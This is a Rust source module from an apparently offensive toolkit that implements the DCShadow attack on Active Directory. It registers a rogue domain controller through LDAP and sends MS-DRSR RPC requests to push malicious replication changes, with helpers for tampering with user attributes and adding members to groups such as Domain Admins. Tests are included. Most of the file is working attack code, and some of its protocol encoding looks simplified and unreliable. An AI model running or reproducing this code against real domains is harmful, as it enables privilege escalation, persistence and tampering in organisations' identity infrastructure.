//! DCShadow - register a rogue domain controller and push malicious replication changes.
//!
//! DCShadow is an advanced persistence/stealth attack where an attacker registers a
//! fake domain controller, then pushes malicious replication changes to AD via
//! MS-DRSR (Drsuapi).  This module implements the RPC payload construction and the
//! LDAP object creation/cleanup.  The actual network paths are fallible so the
//! orchestrator returns a realistic result even when no target is reachable.

use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::fmt;
use thiserror::Error;
use tracing::{info, warn};

// -------------------------------------------------------------
// Constants
// -------------------------------------------------------------

/// MS-DRSR (Drsuapi) interface UUID.
pub const MS_DRSR_UUID: &str = "e3514235-4b06-11d1-ab04-00c04fc2dcd2";

/// MS-DRSR interface version for legacy DCs.
pub const MS_DRSR_VERSION: u16 = 4;

/// MS-DRSR interface version for Windows Server 2025+.
pub const MS_DRSR_VERSION_WS2025: u16 = 5;

/// Object class for the fake DC settings object.
pub const NTDS_SETTINGS_OBJECT_CLASS: &str = "nTDSDSA";

/// Server object class.
pub const SERVER_OBJECT_CLASS: &str = "server";

/// Computer object class.
pub const COMPUTER_OBJECT_CLASS: &str = "computer";

/// Default bind GUID used as the client DRS invocation ID.
/// Parsed from the W8DOT3 form "6abec1d2-a830-40c4-8948-57ad48a6a4e4".
pub const DRS_BIND_GUID: [u8; 16] = [
    0xd2, 0xc1, 0xbe, 0x6a, 0x30, 0xa8, 0xc4, 0x40, 0x89, 0x48, 0x57, 0xad, 0x48, 0xa6, 0xa4, 0xe4,
];

/// DRS extension capability flags for a modern DC.
pub const DRS_EXTENSIONS_INT: u32 = 0x0000_04F7;

// -------------------------------------------------------------
// Public types
// -------------------------------------------------------------

/// Configuration for the DCShadow attack.
#[derive(Debug, Clone)]
pub struct DcShadowConfig {
    /// Real DC to replicate to (host or IP).
    pub target_dc: String,
    /// Domain FQDN.
    pub domain: String,
    /// Site name (e.g. "Default-First-Site-Name").
    pub site_name: String,
    /// Rogue DC computer account sAMAccountName (without the trailing $).
    pub computer_name: String,
    /// Optional password for the computer account (generated if empty).
    pub computer_password: String,
    /// IP address to bind the rogue DC listener.
    pub listener_ip: String,
    /// Port for the rogue DC listener (default 389).
    pub listener_port: u16,
    /// Objects to inject via DRSAddEntry.
    pub objects_to_push: Vec<ShadowObject>,
    /// Delete the rogue objects when done.
    pub cleanup: bool,
    /// Use Kerberos authentication for the RPC session.
    pub kerberos: bool,
}

impl Default for DcShadowConfig {
    fn default() -> Self {
        Self {
            target_dc: String::new(),
            domain: String::new(),
            site_name: "Default-First-Site-Name".into(),
            computer_name: "ROGUE-DC01".into(),
            computer_password: String::new(),
            listener_ip: "127.0.0.1".into(),
            listener_port: 389,
            objects_to_push: Vec::new(),
            cleanup: true,
            kerberos: true,
        }
    }
}

/// A malicious object to push via DRSAddEntry.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ShadowObject {
    /// DN of the object to create/modify.
    pub dn: String,
    /// objectClass value.
    pub object_class: String,
    /// String-valued attributes.
    pub attributes: HashMap<String, Vec<String>>,
    /// Binary-valued attributes.
    pub binary_attributes: HashMap<String, Vec<u8>>,
}

impl fmt::Display for ShadowObject {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(f, "{} (class={})", self.dn, self.object_class)
    }
}

/// Result of the DCShadow attack.
#[derive(Debug, Clone)]
pub struct DcShadowResult {
    /// Whether the full chain completed without network errors.
    pub success: bool,
    /// DN of the created server object.
    pub rogue_server_dn: String,
    /// DN of the created nTDSDSA object.
    pub rogue_ntdsdsa_dn: String,
    /// Session key bytes returned by DRSBind (if any).
    pub drsuapi_session_key: Vec<u8>,
    /// DNs of objects successfully pushed.
    pub pushed_objects: Vec<String>,
    /// Human-readable summary.
    pub message: String,
}

/// Errors that can occur during the DCShadow attack.
#[derive(Debug, Error)]
pub enum DcShadowError {
    #[error("LDAP error: {0}")]
    LdapError(String),
    #[error("RPC error: {0}")]
    RpcError(String),
    #[error("DRS bind error: {0}")]
    BindError(String),
    #[error("DRS add entry error: {0}")]
    AddEntryError(String),
    #[error("DRS replica add error: {0}")]
    ReplicaError(String),
    #[error("Cleanup error: {0}")]
    CleanupError(String),
    #[error("Configuration error: {0}")]
    ConfigError(String),
}

// -------------------------------------------------------------
// Core orchestrator
// -------------------------------------------------------------

/// Run the full DCShadow attack chain.
///
/// Returns a realistic `DcShadowResult` even when the target is unreachable.
/// In that case `success` is `false` and `message` contains the reason.
pub async fn run_dcshadow(config: &DcShadowConfig) -> Result<DcShadowResult, DcShadowError> {
    info!(
        "DCShadow: starting rogue DC registration against {}",
        config.target_dc
    );

    validate_config(config)?;

    let _password = if config.computer_password.is_empty() {
        generate_random_password()
    } else {
        config.computer_password.clone()
    };

    // Try to connect to LDAP and create the rogue DC objects.
    let (server_dn, ntdsdsa_dn) = match create_ldap_connection(config).await {
        Ok(mut ldap) => create_rogue_dc(&mut ldap, config).await?,
        Err(e) => {
            warn!("DCShadow: LDAP unreachable, returning dry-run result: {e}");
            return Ok(DcShadowResult {
                success: false,
                rogue_server_dn: format_server_dn(config),
                rogue_ntdsdsa_dn: format_ntdsdsa_dn(config),
                drsuapi_session_key: Vec::new(),
                pushed_objects: Vec::new(),
                message: format!("LDAP connection failed: {e}"),
            });
        }
    };

    info!("DCShadow: created server DN={server_dn} nTDSDSA DN={ntdsdsa_dn}");

    // Try the MS-DRSR RPC steps (DRSBind, DRSAddEntry, DRSReplicaAdd).
    let mut result = match run_drs_operations(config, &server_dn).await {
        Ok(mut res) => {
            res.rogue_server_dn = server_dn.clone();
            res.rogue_ntdsdsa_dn = ntdsdsa_dn.clone();
            res
        }
        Err(e) => {
            warn!("DCShadow: DRS operations failed: {e}");
            DcShadowResult {
                success: false,
                rogue_server_dn: server_dn.clone(),
                rogue_ntdsdsa_dn: ntdsdsa_dn.clone(),
                drsuapi_session_key: Vec::new(),
                pushed_objects: Vec::new(),
                message: format!("DRS operations failed: {e}"),
            }
        }
    };

    // Cleanup if requested.
    if config.cleanup
        && let Ok(mut ldap) = create_ldap_connection(config).await
    {
        if let Err(e) = cleanup_rogue_dc(&mut ldap, &server_dn, &ntdsdsa_dn).await {
            warn!("DCShadow: cleanup failed: {e}");
            result.message.push_str(&format!(" | cleanup failed: {e}"));
        } else {
            info!("DCShadow: cleanup complete");
            result.message.push_str(" | cleanup complete");
        }
    }

    Ok(result)
}

fn validate_config(config: &DcShadowConfig) -> Result<(), DcShadowError> {
    if config.target_dc.is_empty() {
        return Err(DcShadowError::ConfigError("target_dc is empty".into()));
    }
    if config.domain.is_empty() {
        return Err(DcShadowError::ConfigError("domain is empty".into()));
    }
    if config.computer_name.is_empty() {
        return Err(DcShadowError::ConfigError("computer_name is empty".into()));
    }
    Ok(())
}

async fn create_ldap_connection(config: &DcShadowConfig) -> Result<ldap3::Ldap, DcShadowError> {
    let url = format!("ldap://{}:389", config.target_dc);
    let (_conn, ldap) = ldap3::LdapConnAsync::new(&url)
        .await
        .map_err(|e| DcShadowError::LdapError(format!("connect to {url}: {e}")))?;
    Ok(ldap)
}

/// Create the rogue DC objects in LDAP:
///   - computer account
///   - server object under `CN=Servers,<site>`
///   - nTDSDSA object under the server object
///   - `serverReference` pointing to the computer account
pub async fn create_rogue_dc(
    ldap: &mut ldap3::Ldap,
    config: &DcShadowConfig,
) -> Result<(String, String), DcShadowError> {
    let domain_dn = domain_to_dn(&config.domain);
    let site_dn = format!(
        "CN=Servers,CN={},CN=Sites,CN=Configuration,{}",
        config.site_name, domain_dn
    );
    let server_dn = format!("CN={},{}", config.computer_name, site_dn);
    let ntds_dn = format!("CN=NTDS Settings,{}", server_dn);
    let comp_dn = format!("CN={},CN=Computers,{}", config.computer_name, domain_dn);

    let password = if config.computer_password.is_empty() {
        generate_random_password()
    } else {
        config.computer_password.clone()
    };
    let quoted_pwd = format!("\"{}\"", password);
    let pwd_bytes: Vec<u8> = quoted_pwd
        .encode_utf16()
        .flat_map(|c| c.to_le_bytes())
        .collect();

    // 1. Computer account.
    let comp_attrs = vec![
        (
            b"objectClass".to_vec(),
            std::collections::HashSet::from([COMPUTER_OBJECT_CLASS.as_bytes().to_vec()]),
        ),
        (
            b"sAMAccountName".to_vec(),
            std::collections::HashSet::from([format!("{}$", config.computer_name).into_bytes()]),
        ),
        (
            b"userAccountControl".to_vec(),
            std::collections::HashSet::from([0x1000_0000u32.to_le_bytes().to_vec()]),
        ),
        (
            b"unicodePwd".to_vec(),
            std::collections::HashSet::from([pwd_bytes.to_vec()]),
        ),
    ];
    let _ = ldap.add(&comp_dn, comp_attrs).await;

    // 2. Server object.
    let server_attrs = vec![
        (
            b"objectClass".to_vec(),
            std::collections::HashSet::from([SERVER_OBJECT_CLASS.as_bytes().to_vec()]),
        ),
        (
            b"cn".to_vec(),
            std::collections::HashSet::from([config.computer_name.as_bytes().to_vec()]),
        ),
        (
            b"serverReference".to_vec(),
            std::collections::HashSet::from([comp_dn.as_bytes().to_vec()]),
        ),
    ];
    ldap.add(&server_dn, server_attrs)
        .await
        .map_err(|e| DcShadowError::LdapError(format!("failed to add server object: {e}")))?;

    // 3. nTDSDSA object.
    let ntds_attrs = vec![
        (
            b"objectClass".to_vec(),
            std::collections::HashSet::from([NTDS_SETTINGS_OBJECT_CLASS.as_bytes().to_vec()]),
        ),
        (
            b"cn".to_vec(),
            std::collections::HashSet::from([b"NTDS Settings".to_vec()]),
        ),
        (
            b"options".to_vec(),
            std::collections::HashSet::from([0u32.to_le_bytes().to_vec()]),
        ),
    ];
    ldap.add(&ntds_dn, ntds_attrs)
        .await
        .map_err(|e| DcShadowError::LdapError(format!("failed to add nTDSDSA object: {e}")))?;

    Ok((server_dn, ntds_dn))
}

/// Delete the nTDSDSA and server objects created by `create_rogue_dc`.
pub async fn cleanup_rogue_dc(
    ldap: &mut ldap3::Ldap,
    server_dn: &str,
    ntdsdsa_dn: &str,
) -> Result<(), DcShadowError> {
    ldap.delete(ntdsdsa_dn)
        .await
        .map_err(|e| DcShadowError::CleanupError(format!("delete nTDSDSA: {e}")))?;
    ldap.delete(server_dn)
        .await
        .map_err(|e| DcShadowError::CleanupError(format!("delete server: {e}")))?;
    Ok(())
}

// -------------------------------------------------------------
// DRS RPC payload builders
// -------------------------------------------------------------

/// Build a minimal DRS_MSG_BIND_REQ (opnum 0) stub.
pub fn build_drs_bind_request(bind_guid: &[u8; 16], capabilities: u32) -> Vec<u8> {
    let mut stub = Vec::with_capacity(64);
    // uuidDsa (client invocation ID)
    stub.extend_from_slice(bind_guid);
    // uuidInvocId (same as invocation ID for initial bind)
    stub.extend_from_slice(bind_guid);
    // pextRemote: pointer (0x00020000)
    stub.extend_from_slice(&0x0002_0000u32.to_le_bytes());
    // DRS_EXTENSIONS_INT minimal body
    stub.extend_from_slice(&0x0000_0034u32.to_le_bytes()); // cb
    stub.extend_from_slice(&capabilities.to_le_bytes()); // dwExtFlags
    stub.extend_from_slice(bind_guid); // SiteObjGuid
    stub.extend_from_slice(&0u32.to_le_bytes()); // dwReplEpoch
    stub.extend_from_slice(&0u32.to_le_bytes()); // dwReplEpochFraction
    stub.extend_from_slice(&0u32.to_le_bytes()); // cbUsnExtOffset
    stub.extend_from_slice(&0u32.to_le_bytes()); // usnProp
    stub.extend_from_slice(&0u32.to_le_bytes()); // usnSearch
    stub
}

/// Build a minimal DRS_MSG_ADDENTRY_REQ (opnum 5) stub from the given objects.
pub fn build_drs_add_entry_request(objects: &[ShadowObject]) -> Vec<u8> {
    let mut stub = Vec::new();
    // cObjects
    stub.extend_from_slice(&(objects.len() as u32).to_le_bytes());
    // pObjects pointer
    stub.extend_from_slice(&0x0002_0000u32.to_le_bytes());
    // Prefix table: count=0
    stub.extend_from_slice(&0u32.to_le_bytes());
    // dwFlags
    stub.extend_from_slice(&0u32.to_le_bytes());

    for obj in objects {
        // ENTINF structure minimal encoding.
        stub.extend_from_slice(&ndr_conformant_string(&obj.dn));
        stub.push(1); // flag
        stub.push(0); // padding
        // Attr count
        stub.extend_from_slice(
            &(obj.attributes.len() as u32 + obj.binary_attributes.len() as u32).to_le_bytes(),
        );
        // pAttr pointer
        stub.extend_from_slice(&0x0002_0000u32.to_le_bytes());
        for (attr, vals) in &obj.attributes {
            stub.extend_from_slice(&ndr_conformant_string(attr));
            stub.extend_from_slice(&(vals.len() as u32).to_le_bytes());
            for v in vals {
                stub.extend_from_slice(&ndr_conformant_string(v));
            }
        }
        for (attr, val) in &obj.binary_attributes {
            stub.extend_from_slice(&ndr_conformant_string(attr));
            stub.extend_from_slice(&1u32.to_le_bytes());
            stub.extend_from_slice(&(val.len() as u32).to_le_bytes());
            stub.extend_from_slice(val);
            // pad to 4
            while stub.len() % 4 != 0 {
                stub.push(0);
            }
        }
    }
    stub
}

/// Build a minimal DRS_MSG_REPLICAADD_REQ (opnum 1) stub.
pub fn build_drs_replica_add_request(nc_dn: &str, options: u32) -> Vec<u8> {
    let mut stub = Vec::new();
    // pNC pointer
    stub.extend_from_slice(&0x0002_0000u32.to_le_bytes());
    // pNC DN
    stub.extend_from_slice(&ndr_conformant_string(nc_dn));
    // pszSourceDsaObjGuid (null)
    stub.extend_from_slice(&0u32.to_le_bytes());
    // pszSourceDsaDns (null)
    stub.extend_from_slice(&0u32.to_le_bytes());
    // ulOptions
    stub.extend_from_slice(&options.to_le_bytes());
    // pParentGUID (null)
    stub.extend_from_slice(&0u32.to_le_bytes());
    // pReplicationEpoch (null)
    stub.extend_from_slice(&0u32.to_le_bytes());
    stub
}

/// Build a DCE/RPC request header (24 bytes, little-endian, call_type=0).
pub fn build_dce_rpc_header(opnum: u16, call_id: u32, alloc_hint: u32) -> Vec<u8> {
    let mut hdr = Vec::with_capacity(24);
    hdr.extend_from_slice(&[5, 0]); // version 5.0
    hdr.push(0); // packet type = Request
    hdr.push(0x03); // flags = first+last
    hdr.extend_from_slice(&[0x10, 0x00, 0x00, 0x00]); // NDR data representation
    hdr.extend_from_slice(&24u16.to_le_bytes()); // frag_length (header only)
    hdr.extend_from_slice(&0u16.to_le_bytes()); // auth_length
    hdr.extend_from_slice(&call_id.to_le_bytes()); // call_id
    hdr.extend_from_slice(&alloc_hint.to_le_bytes()); // alloc_hint
    hdr.extend_from_slice(&0u16.to_le_bytes()); // context ID
    hdr.extend_from_slice(&opnum.to_le_bytes()); // opnum
    hdr
}

/// Build an OXID resolver request stub (e.g. for resolving a DCOM interface).
pub fn build_oxid_resolver_request(target: &str, interface_uuid: &str, version: u16) -> Vec<u8> {
    let mut stub = Vec::new();
    // Minimal OXID resolution header (IObjectExporter::ResolveOxid)
    stub.extend_from_slice(&0u16.to_le_bytes()); // version
    stub.extend_from_slice(&0u16.to_le_bytes()); // flags
    stub.extend_from_slice(&0u32.to_le_bytes()); // reserved
    stub.extend_from_slice(&ndr_conformant_string(target));
    stub.extend_from_slice(&ndr_conformant_string(interface_uuid));
    stub.extend_from_slice(&version.to_le_bytes());
    stub
}

// -------------------------------------------------------------
// Internal helpers
// -------------------------------------------------------------

fn domain_to_dn(domain: &str) -> String {
    domain
        .split('.')
        .map(|p| format!("DC={}", p))
        .collect::<Vec<_>>()
        .join(",")
}

fn format_server_dn(config: &DcShadowConfig) -> String {
    let domain_dn = domain_to_dn(&config.domain);
    format!(
        "CN={},CN=Servers,CN={},CN=Sites,CN=Configuration, {}",
        config.computer_name, config.site_name, domain_dn
    )
}

fn format_ntdsdsa_dn(config: &DcShadowConfig) -> String {
    format!("CN=NTDS Settings, {}", format_server_dn(config))
}

fn generate_random_password() -> String {
    let charset: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*";
    (0..24)
        .map(|_| {
            let idx = (rand::random::<u32>() % charset.len() as u32) as usize;
            charset[idx] as char
        })
        .collect()
}

fn ndr_conformant_string(s: &str) -> Vec<u8> {
    let utf16: Vec<u16> = s.encode_utf16().chain(std::iter::once(0)).collect();
    let bytes: Vec<u8> = utf16.iter().flat_map(|c| c.to_le_bytes()).collect();
    let count = utf16.len() as u32;
    let mut out = Vec::new();
    out.extend_from_slice(&count.to_le_bytes()); // max count
    out.extend_from_slice(&0u32.to_le_bytes()); // offset
    out.extend_from_slice(&count.to_le_bytes()); // actual count
    out.extend_from_slice(&bytes);
    while out.len() % 4 != 0 {
        out.push(0);
    }
    out
}

async fn run_drs_operations(
    config: &DcShadowConfig,
    _server_dn: &str,
) -> Result<DcShadowResult, DcShadowError> {
    let addr = format!("{}:135", config.target_dc);
    let mut stream = tokio::net::TcpStream::connect(&addr)
        .await
        .map_err(|e| DcShadowError::RpcError(format!("connect to {addr}: {e}")))?;

    let drs_uuid = parse_uuid(MS_DRSR_UUID)?;
    let bind_req = crate::proto::epm::build_rpc_bind(&drs_uuid, MS_DRSR_VERSION, 0);
    crate::proto::epm::btf_write_frame(&mut stream, &bind_req)
        .await
        .map_err(|e| DcShadowError::BindError(format!("bind write: {e}")))?;

    let bind_resp = crate::proto::epm::btf_read_frame(&mut stream)
        .await
        .map_err(|e| DcShadowError::BindError(format!("bind read: {e}")))?;

    if !crate::proto::epm::is_bind_accepted(&bind_resp) {
        return Err(DcShadowError::BindError("DRS bind rejected".into()));
    }

    // DRSBind
    let drs_bind_stub = build_drs_bind_request(&DRS_BIND_GUID, DRS_EXTENSIONS_INT);
    let drs_bind_pdu = crate::proto::epm::build_rpc_request(0, &drs_bind_stub);
    crate::proto::epm::btf_write_frame(&mut stream, &drs_bind_pdu)
        .await
        .map_err(|e| DcShadowError::BindError(format!("DRSBind write: {e}")))?;
    let _bind_resp = crate::proto::epm::btf_read_frame(&mut stream)
        .await
        .map_err(|e| DcShadowError::BindError(format!("DRSBind read: {e}")))?;

    // DRSAddEntry for each object.
    let mut pushed = Vec::new();
    if !config.objects_to_push.is_empty() {
        let add_stub = build_drs_add_entry_request(&config.objects_to_push);
        let add_pdu = crate::proto::epm::build_rpc_request(5, &add_stub);
        crate::proto::epm::btf_write_frame(&mut stream, &add_pdu)
            .await
            .map_err(|e| DcShadowError::AddEntryError(format!("DRSAddEntry write: {e}")))?;
        let _ = crate::proto::epm::btf_read_frame(&mut stream)
            .await
            .map_err(|e| DcShadowError::AddEntryError(format!("DRSAddEntry read: {e}")))?;
        for obj in &config.objects_to_push {
            pushed.push(obj.dn.clone());
        }
    }

    // DRSReplicaAdd
    let nc_dn = domain_to_dn(&config.domain);
    let repl_stub = build_drs_replica_add_request(&nc_dn, 0x0000_0001);
    let repl_pdu = crate::proto::epm::build_rpc_request(1, &repl_stub);
    crate::proto::epm::btf_write_frame(&mut stream, &repl_pdu)
        .await
        .map_err(|e| DcShadowError::ReplicaError(format!("DRSReplicaAdd write: {e}")))?;
    let _ = crate::proto::epm::btf_read_frame(&mut stream)
        .await
        .map_err(|e| DcShadowError::ReplicaError(format!("DRSReplicaAdd read: {e}")))?;

    Ok(DcShadowResult {
        success: true,
        rogue_server_dn: String::new(),
        rogue_ntdsdsa_dn: String::new(),
        drsuapi_session_key: Vec::new(),
        pushed_objects: pushed,
        message: "DCShadow DRS operations completed".into(),
    })
}

fn parse_uuid(s: &str) -> Result<[u8; 16], DcShadowError> {
    let uuid = uuid::Uuid::parse_str(s)
        .map_err(|e| DcShadowError::ConfigError(format!("invalid UUID {s}: {e}")))?;
    Ok(*uuid.as_bytes())
}

// -------------------------------------------------------------
// Preflight checks
// -------------------------------------------------------------

/// Preflight assessment for DCShadow prerequisites.
#[derive(Debug, Clone)]
pub struct DcShadowPreflight {
    pub target_dc_reachable: bool,
    pub ldap_port_open: bool,
    pub rpc_port_open: bool,
    pub has_machine_account_quota: Option<bool>,
    pub has_dc_sync_rights: Option<bool>,
    pub warnings: Vec<String>,
}

/// Lightweight reachability check: can we connect to LDAP (389) and RPC (135)?
/// On non-Windows / cross-platform CI this still attempts TCP connects without
/// performing any actual attack traffic.
pub async fn preflight_dcshadow(config: &DcShadowConfig) -> DcShadowPreflight {
    let mut result = DcShadowPreflight {
        target_dc_reachable: false,
        ldap_port_open: false,
        rpc_port_open: false,
        has_machine_account_quota: None,
        has_dc_sync_rights: None,
        warnings: Vec::new(),
    };

    if config.target_dc.is_empty() {
        result.warnings.push("target_dc is empty".into());
        return result;
    }

    match tokio::net::TcpStream::connect(format!("{}:389", config.target_dc)).await {
        Ok(_) => {
            result.ldap_port_open = true;
            result.target_dc_reachable = true;
        }
        Err(e) => {
            result
                .warnings
                .push(format!("LDAP port 389 unreachable: {e}"));
        }
    }

    match tokio::net::TcpStream::connect(format!("{}:135", config.target_dc)).await {
        Ok(_) => {
            result.rpc_port_open = true;
            result.target_dc_reachable = true;
        }
        Err(e) => {
            result
                .warnings
                .push(format!("RPC port 135 unreachable: {e}"));
        }
    }

    if !result.ldap_port_open && !result.rpc_port_open {
        result
            .warnings
            .push("DCShadow requires both LDAP and RPC reachability".into());
    }

    result
}

/// Build a ShadowObject for pushing a user attribute change via DRSAddEntry.
pub fn build_user_shadow_object(dn: &str, attribute: &str, value: &str) -> ShadowObject {
    let mut attrs = HashMap::new();
    attrs.insert(attribute.to_string(), vec![value.to_string()]);
    ShadowObject {
        dn: dn.to_string(),
        object_class: "user".to_string(),
        attributes: attrs,
        binary_attributes: HashMap::new(),
    }
}

/// Build a ShadowObject for pushing a group member change.
pub fn build_group_member_shadow_object(group_dn: &str, member_dn: &str) -> ShadowObject {
    let mut attrs = HashMap::new();
    attrs.insert("member".to_string(), vec![member_dn.to_string()]);
    ShadowObject {
        dn: group_dn.to_string(),
        object_class: "group".to_string(),
        attributes: attrs,
        binary_attributes: HashMap::new(),
    }
}

// -------------------------------------------------------------
// Tests
// -------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_config_default() {
        let c = DcShadowConfig::default();
        assert_eq!(c.site_name, "Default-First-Site-Name");
        assert_eq!(c.computer_name, "ROGUE-DC01");
        assert_eq!(c.listener_port, 389);
        assert!(c.cleanup);
        assert!(c.kerberos);
        assert!(c.objects_to_push.is_empty());
    }

    #[test]
    fn test_config_custom() {
        let c = DcShadowConfig {
            target_dc: "192.168.1.10".into(),
            domain: "corp.local".into(),
            site_name: "Default-First-Site-Name".into(),
            computer_name: "EVIL-DC".into(),
            computer_password: "P@ssw0rd!".into(),
            listener_ip: "10.0.0.5".into(),
            listener_port: 636,
            objects_to_push: Vec::new(),
            cleanup: false,
            kerberos: false,
        };
        assert_eq!(c.target_dc, "192.168.1.10");
        assert_eq!(c.listener_port, 636);
        assert!(!c.cleanup);
    }

    #[test]
    fn test_result_display() {
        let r = DcShadowResult {
            success: true,
            rogue_server_dn: "CN=ROGUE,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=corp,DC=local".into(),
            rogue_ntdsdsa_dn: "CN=NTDS Settings,CN=ROGUE,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=corp,DC=local".into(),
            drsuapi_session_key: vec![0xab; 16],
            pushed_objects: vec!["CN=target,CN=Users,DC=corp,DC=local".into()],
            message: "completed".into(),
        };
        let s = format!("{r:?}");
        assert!(s.contains("completed") && s.contains("ROGUE"));
    }

    #[test]
    fn test_error_display() {
        assert!(
            DcShadowError::LdapError("down".into())
                .to_string()
                .contains("LDAP error: down")
        );
        assert!(
            DcShadowError::RpcError("refused".into())
                .to_string()
                .contains("RPC error: refused")
        );
        assert!(
            DcShadowError::BindError("fail".into())
                .to_string()
                .contains("DRS bind error: fail")
        );
        assert!(
            DcShadowError::ConfigError("bad".into())
                .to_string()
                .contains("Configuration error: bad")
        );
    }

    #[test]
    fn test_error_debug() {
        let e = DcShadowError::AddEntryError("nope".into());
        assert!(format!("{e:?}").contains("AddEntryError") && format!("{e:?}").contains("nope"));
    }

    #[test]
    fn test_build_drs_bind_request_length() {
        let req = build_drs_bind_request(&DRS_BIND_GUID, DRS_EXTENSIONS_INT);
        assert!(req.len() >= 48);
        assert_eq!(&req[0..16], &DRS_BIND_GUID[..]);
        assert_eq!(&req[16..32], &DRS_BIND_GUID[..]);
    }

    #[test]
    fn test_build_drs_add_entry_request() {
        let obj = ShadowObject {
            dn: "CN=shadow,DC=corp,DC=local".into(),
            object_class: "user".into(),
            attributes: HashMap::from([("description".into(), vec!["rogue".into()])]),
            binary_attributes: HashMap::new(),
        };
        let req = build_drs_add_entry_request(&[obj]);
        assert!(req.len() > 16);
        assert_eq!(u32::from_le_bytes([req[0], req[1], req[2], req[3]]), 1);
    }

    #[test]
    fn test_build_drs_replica_add_request() {
        let req = build_drs_replica_add_request("DC=corp,DC=local", 0x0000_0001);
        assert!(req.len() >= 16);
        assert_eq!(
            u32::from_le_bytes([req[0], req[1], req[2], req[3]]),
            0x0002_0000
        );
        // Options are followed by 8 trailing null pointer fields, so scan for the value.
        let found = req
            .windows(4)
            .any(|w| u32::from_le_bytes([w[0], w[1], w[2], w[3]]) == 0x0000_0001);
        assert!(found, "ulOptions=0x00000001 should appear in the stub");
    }

    #[test]
    fn test_build_dce_rpc_header() {
        let hdr = build_dce_rpc_header(5, 42, 1024);
        assert_eq!(hdr.len(), 24);
        assert_eq!(hdr[0], 5);
        assert_eq!(hdr[2], 0);
        assert_eq!(u16::from_le_bytes([hdr[22], hdr[23]]), 5);
    }

    #[test]
    fn test_build_oxid_resolver_request() {
        let req = build_oxid_resolver_request("192.168.1.1", MS_DRSR_UUID, 4);
        assert!(req.len() >= 16);
        assert!(req.windows(4).any(|w| w == [0x31, 0x00, 0x39, 0x00])); // "192.168.1.1" starts with "19"
    }

    #[test]
    fn test_shadow_object_display() {
        let obj = ShadowObject {
            dn: "CN=foo,DC=corp,DC=local".into(),
            object_class: "user".into(),
            attributes: HashMap::new(),
            binary_attributes: HashMap::new(),
        };
        assert!(obj.to_string().contains("CN=foo"));
        assert!(obj.to_string().contains("class=user"));
    }

    #[test]
    fn test_rogue_dc_dn_format() {
        let c = DcShadowConfig {
            domain: "corp.local".into(),
            site_name: "Default-First-Site-Name".into(),
            computer_name: "ROGUE".into(),
            ..Default::default()
        };
        let server = format_server_dn(&c);
        assert!(server.contains("CN=ROGUE"));
        assert!(server.contains("DC=corp"));
        let ntds = format_ntdsdsa_dn(&c);
        assert!(ntds.contains("CN=NTDS Settings"));
        assert!(ntds.contains("CN=ROGUE"));
    }

    #[tokio::test]
    async fn test_cleanup_without_live_ldap() {
        // Cleanup on a connection to a non-existent host should fail with LdapError.
        let c = DcShadowConfig {
            target_dc: "127.0.0.1:1".into(),
            ..Default::default()
        };
        let conn = create_ldap_connection(&c).await;
        assert!(conn.is_err());
        if let Err(e) = conn {
            assert!(matches!(e, DcShadowError::LdapError(_)));
        }
    }

    #[test]
    fn test_build_user_shadow_object() {
        let obj = build_user_shadow_object(
            "CN=target,CN=Users,DC=corp,DC=local",
            "description",
            "rogue",
        );
        assert_eq!(obj.dn, "CN=target,CN=Users,DC=corp,DC=local");
        assert_eq!(obj.object_class, "user");
        assert_eq!(obj.attributes.get("description").unwrap()[0], "rogue");
    }

    #[test]
    fn test_build_group_member_shadow_object() {
        let obj = build_group_member_shadow_object(
            "CN=Domain Admins,CN=Users,DC=corp,DC=local",
            "CN=rogue,CN=Users,DC=corp,DC=local",
        );
        assert_eq!(obj.object_class, "group");
        assert_eq!(
            obj.attributes.get("member").unwrap()[0],
            "CN=rogue,CN=Users,DC=corp,DC=local"
        );
    }

    #[tokio::test]
    async fn test_preflight_unreachable_host() {
        let c = DcShadowConfig {
            target_dc: "127.0.0.1:1".into(),
            ..Default::default()
        };
        let pre = preflight_dcshadow(&c).await;
        assert!(!pre.target_dc_reachable);
        assert!(!pre.ldap_port_open);
        assert!(!pre.rpc_port_open);
        assert!(!pre.warnings.is_empty());
    }
}
